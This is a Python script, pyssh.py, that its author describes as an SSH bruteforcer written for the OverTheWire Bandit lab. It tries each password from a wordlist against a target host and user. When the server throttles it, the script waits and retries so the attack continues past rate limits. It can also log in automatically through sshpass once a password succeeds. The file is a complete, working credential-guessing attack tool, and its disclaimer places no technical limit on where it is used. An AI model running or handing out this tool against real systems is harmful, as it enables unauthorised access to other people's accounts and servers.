#!/usr/bin/env python

'''
    pyssh.py - A simple ssh bruteforcer.

        This script is made to automate my www.overthewire.org bandit lab.
        Make sure you have permissions in using the script to ssh servers.

    Disclaimer:
        I am not liable for attacking / bruteforcing ssh servers using this script.

    NOTE:
        --connect option only works on linux. 

    DEPENDENCIES:
        sshpass

        sudo apt-get install -y sshpass
'''

import argparse
import paramiko
import platform
import socket
import subprocess
import sys
import time


FAILED = '\033[31m[-]\033[0;0m'
SUCCESS = '\033[32m[+]\033[0;0m'
PROMPT = '\033[36m[>]\033[0;0m'
WORKING = '\033[33m[*]\033[0;0m'


def get_os():

    # Get Platform | LINUX | WINDOWS
    return platform.system()


def is_ssh_open(hostname, username, password, port, delay):

    # Initialize ssh client

    ssh = paramiko.SSHClient()

    # Accept unknown host, add to known hosts

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:

        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)

    # Host unreachable

    except socket.timeout:

        print('%s Host: %s is unreachable on port %s: Session timed out.' % (FAILED, hostname, port))
        return False

    # Failed Authentication

    except paramiko.AuthenticationException as err:

        print('%s SSH to port %s on %s: %s\n%s Password: %s' % (FAILED, port, hostname, err, FAILED, password))
        return False

    # Retry with delay if detected
        # Default (Fastest): 1 min
        # 3: (Fast): 5 min
        # 2: (Slow): 15 min
        # 1: (Slowest): 1 hour

    except paramiko.SSHException:

        print('%s Connection Exceeded. Retrying in %s second(s).' % (PROMPT, delay))

        # Cancelable timeout
        for i in range(1, delay):
            time.sleep(1)

        return is_ssh_open(hostname, username, password, port, delay)

    else:

        # Connection established to ssh
        print('%s SSH to port %s on %s Connection Successful.\n%s Password: %s' % (SUCCESS, port, hostname, SUCCESS, password))
        return True


def main():

    # Create parser

    parser = argparse.ArgumentParser(
        description='A Simple python SSH bruteforce script',
        allow_abbrev=False
    )

    parser.add_argument(
        '-H', '--host',
        metavar='',
        required=True,
        help='IP address or Hostname of SSH server to bruteforce.'
    )

    parser.add_argument(
        '-P', '--passwdlist',
        metavar='',
        required=True,
        help='Pass as argument the file.txt file that contain lists of passwords.'
    )

    parser.add_argument(
        '-u', '--username',
        metavar='',
        required=True,
        help='username. EX: <username>@1.1.1.1'
    )

    parser.add_argument(
        '-p', '--port',
        metavar='',
        help='Port 22 is default. If not specified'
    )

    parser.add_argument(
        '-t', '--timeout',
        metavar='',
        help='If the server detected a bruteforcer, adds a delay timeout 4 as default fastest 1 is the slowest'
    )

    parser.add_argument(
        '-c', '--connect',
        action='store_true',
        help='Auto connect to SSH after the password is found.'
    )

    args = parser.parse_args()

    # Initialize password found
    password_found = None

    # Parse arguments
    username = args.username
    host = args.host
    passwd_list = args.passwdlist

    # Default values
    port = 22

    if args.port:
        port = int(args.port)

    # Timeout if detected by server
    if args.timeout == None:
        delay = 1

    # 1 minute timeout
    elif args.timeout == '4':
        delay = 60

    # 5 minutes timeout
    elif args.timeout == '3':
        delay = 300

    # 15 minutes timeout
    elif args.timeout == '2':
        delay = 900

    # 1 hour timeout
    elif args.timeout == '1':
        delay = 3600

    else:
        print('%s Error: Timeout must be 1 - 4.' % (FAILED))
        sys.exit(1)

    # Read the passwordlist
    try:
        with open(passwd_list, 'r') as passfile:

            print('%s Starting bruteforce.. ' % (WORKING))

            # perform brute force
            for password in passfile:

                password = password.strip()

                if is_ssh_open(host, username, password, port, delay):
                    password_found = password
                    break

        passfile.close()

    except FileNotFoundError:
        print('%s %s not found. Terminating script..' % (FAILED, passwd_list))

    # Connect to ssh using sshpass
    if args.connect and password_found:

        os = get_os()

        if os == "Windows":

            print('%s ERROR: Auto Connect feature not supported on Windows platform.' % FAILED)
            sys.exit(0)

        if os == "Linux":

            # Check if sshpass is installed
            check_sshpass = subprocess.call(
                [
                    '/bin/bash',
                    '-c',
                    "dpkg -l | grep sshpass"
                ]
            )

            if check_sshpass == 1:
                print('%s ERROR: Unable to connect to SSH. sshpass package not found.')
                sys.exit(0)

            if check_sshpass == 0:

                port = str(port)

                subprocess.call(
                    [
                        '/bin/bash',
                        '-c',
                        "sshpass -p \'%s\' ssh -p %s %s@%s" % (password_found, port, username, host)
                    ]
                )


if __name__ == '__main__':
    main()
